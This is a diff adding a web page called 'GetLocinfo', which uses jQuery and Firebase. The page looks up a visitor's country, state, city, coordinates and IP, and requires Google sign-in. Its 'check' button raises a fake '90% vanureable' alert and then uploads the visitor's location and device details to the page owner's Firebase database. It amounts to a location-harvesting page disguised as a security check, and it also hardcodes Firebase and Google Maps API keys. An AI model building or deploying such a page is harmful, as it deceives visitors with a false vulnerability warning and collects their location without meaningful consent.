@@ -1,0 +1,135 @@
+<!--COPYRIGHT MOHD JAMIL
+    instagram:https://www.instagram.com/_mohdjamil
+    linkedin:https://www.linkedin.com/in/mohd-jamil-35508a1b9
+    github:https://www.github.com/mohdjameel2412
+
+-->
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <title>🌏GetLocinfo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link type="image/x-icon" rel="icon" href="https://drive.google.com/uc?id=1wYkiPEffvpY5nA1GsiEgHHpakrF2-yMv">
+  <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+  <script>
+    $.ajax({
+      url: "https://geolocation-db.com/jsonp",
+      jsonpCallback: "callback",
+      dataType: "jsonp",
+      success: function (location) {
+        $('#country').html(location.country_name);
+        $('#state').html(location.state);
+        $('#city').html(location.city);
+        $('#latitude').html(location.latitude);
+        $('#longitude').html(location.longitude);
+        $('#ip').html(location.IPv4);
+      }
+    });
+  </script>
+  <!-- The core Firebase JS SDK is always required and must be listed first -->
+  <script src="/__/firebase/8.2.5/firebase-app.js"></script>
+
+  <!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+  <script src="/__/firebase/8.2.5/firebase-analytics.js"></script>
+
+  <!-- Initialize Firebase -->
+  <script src="/__/firebase/init.js"></script>
+
+  <main class="container">
+    <div id="map" class="map"></div>
+    <p id="info" class="info"></p>
+    <div class="current"><strong>Country: </strong><span id="country"></span></div>
+    <div class="current"><strong>State: </strong><span id="state"></span></div>
+    <div class="current"><strong>City: </strong><span id="city"></span></div>
+    <p id="device" class="device"> </p>
+    <div class="button">
+      <button id="logout">logout</button>
+      <button id="check">check</button>
+    </div>
+  </main>
+
+  <script src="script.js"></script>
+  <script async defer
+    src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAUdbiGaC7EIMfxrHfLP69w21ibKza2cQQ&callback=init"></script>
+  <!-- The core Firebase JS SDK is always required and must be listed first -->
+  <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-auth.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
+  <script>
+    // Your web app's Firebase configuration
+    var firebaseConfig = {
+      apiKey: "AIzaSyDznuhyoDMwLjOturyE6A9_6r23BZ__Yog",
+      authDomain: "getlocinfo-8ce4f.firebaseapp.com",
+      projectId: "getlocinfo-8ce4f",
+      storageBucket: "getlocinfo-8ce4f.appspot.com",
+      messagingSenderId: "678463394098",
+      appId: "1:678463394098:web:ac1c37a3500ef797f4072b",
+      measurementId: "G-4S5MP9LVED"
+
+    };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    document.getElementById('logout').addEventListener('click', LogoutUser)
+
+    let provider = new firebase.auth.GoogleAuthProvider()
+
+    function checkAuthState() {
+      firebase.auth().onAuthStateChanged(user => {
+        if (user) {
+
+        } else {
+          window.location = "index.html"
+
+
+        }
+      })
+    }
+    checkAuthState()
+
+    function LogoutUser() {
+      console.log('Logout Btn Call')
+      firebase.auth().signOut().then(() => {
+        window.location = 'index.html';
+        alert("logged out");
+
+
+      }).catch(e => {
+        console.log(e)
+      })
+    }
+    var info, country, state, city, device;
+
+    function Ready() {
+      info = document.getElementById('info').innerHTML;
+      country = document.getElementById('country').innerHTML;
+      state = document.getElementById('state').innerHTML;
+      city = document.getElementById('city').innerHTML;
+      device = document.getElementById('device').innerHTML;
+
+    }
+    document.getElementById('check').onclick = function () {
+      alert("90% vanureable");
+      Ready();
+      firebase.database().ref('data/'+state).set({
+        info,
+        country,
+        State: state,
+        City: city,
+        Device: device,
+      });
+
+    }
+  </script>
+</body>
+
+</html>
